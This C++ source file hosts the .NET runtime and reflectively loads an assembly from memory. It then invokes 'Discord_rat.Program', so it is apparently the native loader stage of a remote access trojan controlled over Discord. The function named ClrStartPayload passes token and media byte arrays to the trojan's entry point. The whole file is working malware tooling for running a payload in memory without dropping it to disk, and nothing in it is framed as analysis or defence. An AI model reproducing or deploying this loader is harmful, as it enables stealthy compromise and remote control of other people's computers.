#include "clr_host.h"

#include <metahost.h>
#include <comdef.h>

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

#ifdef _WIN64
#import "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorlib.tlb" raw_interfaces_only \
    high_property_prefixes("_get", "_put", "_putref") \
    rename("ReportEvent", "InteropServices_ReportEvent") \
    rename("or", "InteropServices_or")
#else
#import "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorlib.tlb" raw_interfaces_only \
    high_property_prefixes("_get", "_put", "_putref") \
    rename("ReportEvent", "InteropServices_ReportEvent") \
    rename("or", "InteropServices_or")
#endif

static SAFEARRAY* BytesToSafeArray(const BYTE* data, DWORD size)
{
    SAFEARRAYBOUND bound = { size, 0 };
    SAFEARRAY* array = SafeArrayCreate(VT_UI1, 1, &bound);
    if (!array)
    {
        return NULL;
    }

    if (size == 0)
    {
        return array;
    }

    void* buffer = NULL;
    if (FAILED(SafeArrayAccessData(array, &buffer)))
    {
        SafeArrayDestroy(array);
        return NULL;
    }

    CopyMemory(buffer, data, size);
    SafeArrayUnaccessData(array);
    return array;
}

static bool InvokeStart(mscorlib::_TypePtr programType)
{
    mscorlib::_MethodInfoPtr method;
    HRESULT hr = programType->GetMethod_2(
        _bstr_t(L"Start"),
        (mscorlib::BindingFlags)(mscorlib::BindingFlags_Public | mscorlib::BindingFlags_Static),
        &method);
    if (FAILED(hr) || !method)
    {
        return false;
    }

    VARIANT obj;
    VariantInit(&obj);
    obj.vt = VT_EMPTY;

    VARIANT result;
    VariantInit(&result);
    hr = method->Invoke_3(obj, NULL, &result);
    VariantClear(&result);
    return SUCCEEDED(hr);
}

static bool InvokeStartWithModules(mscorlib::_TypePtr programType, SAFEARRAY* tokenArr, SAFEARRAY* mediaArr)
{
    mscorlib::_MethodInfoPtr method;
    HRESULT hr = programType->GetMethod_2(
        _bstr_t(L"StartWithModules"),
        (mscorlib::BindingFlags)(mscorlib::BindingFlags_Public | mscorlib::BindingFlags_Static),
        &method);
    if (FAILED(hr) || !method)
    {
        return false;
    }

    SAFEARRAY* params = SafeArrayCreateVector(VT_VARIANT, 0, 2);
    if (!params)
    {
        return false;
    }

    VARIANT argToken;
    VariantInit(&argToken);
    argToken.vt = VT_ARRAY | VT_UI1;
    argToken.parray = tokenArr;

    VARIANT argMedia;
    VariantInit(&argMedia);
    argMedia.vt = VT_ARRAY | VT_UI1;
    argMedia.parray = mediaArr;

    long index = 0;
    SafeArrayPutElement(params, &index, &argToken);
    index = 1;
    SafeArrayPutElement(params, &index, &argMedia);

    VARIANT obj;
    VariantInit(&obj);
    obj.vt = VT_EMPTY;

    VARIANT result;
    VariantInit(&result);
    hr = method->Invoke_3(obj, params, &result);
    VariantClear(&result);
    SafeArrayDestroy(params);
    return SUCCEEDED(hr);
}

bool ClrStartPayload(const BYTE* core, DWORD coreSize, const BYTE* token, DWORD tokenSize, const BYTE* media, DWORD mediaSize)
{
    if (!core || coreSize == 0)
    {
        return false;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
    {
        return false;
    }

    ICLRMetaHost* metaHost = NULL;
    if (FAILED(CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost)))
    {
        return false;
    }

    ICLRRuntimeInfo* runtimeInfo = NULL;
    if (FAILED(metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo)))
    {
        metaHost->Release();
        return false;
    }

    BOOL loadable = FALSE;
    runtimeInfo->IsLoadable(&loadable);
    if (!loadable)
    {
        runtimeInfo->Release();
        metaHost->Release();
        return false;
    }

    ICorRuntimeHost* corHost = NULL;
    if (FAILED(runtimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&corHost)))
    {
        runtimeInfo->Release();
        metaHost->Release();
        return false;
    }

    if (FAILED(corHost->Start()))
    {
        corHost->Release();
        runtimeInfo->Release();
        metaHost->Release();
        return false;
    }

    IUnknown* appDomainThunk = NULL;
    if (FAILED(corHost->GetDefaultDomain(&appDomainThunk)))
    {
        corHost->Release();
        runtimeInfo->Release();
        metaHost->Release();
        return false;
    }

    mscorlib::_AppDomainPtr appDomain;
    if (FAILED(appDomainThunk->QueryInterface(__uuidof(mscorlib::_AppDomain), (LPVOID*)&appDomain)))
    {
        appDomainThunk->Release();
        corHost->Release();
        runtimeInfo->Release();
        metaHost->Release();
        return false;
    }

    appDomainThunk->Release();

    SAFEARRAY* coreArr = BytesToSafeArray(core, coreSize);
    if (!coreArr)
    {
        corHost->Release();
        runtimeInfo->Release();
        metaHost->Release();
        return false;
    }

    mscorlib::_AssemblyPtr assembly;
    hr = appDomain->Load_3(coreArr, &assembly);
    SafeArrayDestroy(coreArr);
    if (FAILED(hr) || !assembly)
    {
        corHost->Release();
        runtimeInfo->Release();
        metaHost->Release();
        return false;
    }

    mscorlib::_TypePtr programType;
    hr = assembly->GetType_2(_bstr_t(L"Discord_rat.Program"), &programType);
    if (FAILED(hr) || !programType)
    {
        corHost->Release();
        runtimeInfo->Release();
        metaHost->Release();
        return false;
    }

    SAFEARRAY* tokenArr = BytesToSafeArray(token, tokenSize);
    SAFEARRAY* mediaArr = BytesToSafeArray(media, mediaSize);
    if (!tokenArr || !mediaArr)
    {
        if (tokenArr) SafeArrayDestroy(tokenArr);
        if (mediaArr) SafeArrayDestroy(mediaArr);
        corHost->Release();
        runtimeInfo->Release();
        metaHost->Release();
        return false;
    }

    bool started = InvokeStartWithModules(programType, tokenArr, mediaArr);
    if (!started)
    {
        started = InvokeStart(programType);
    }

    SafeArrayDestroy(tokenArr);
    SafeArrayDestroy(mediaArr);
    corHost->Release();
    runtimeInfo->Release();
    metaHost->Release();
    return started;
}
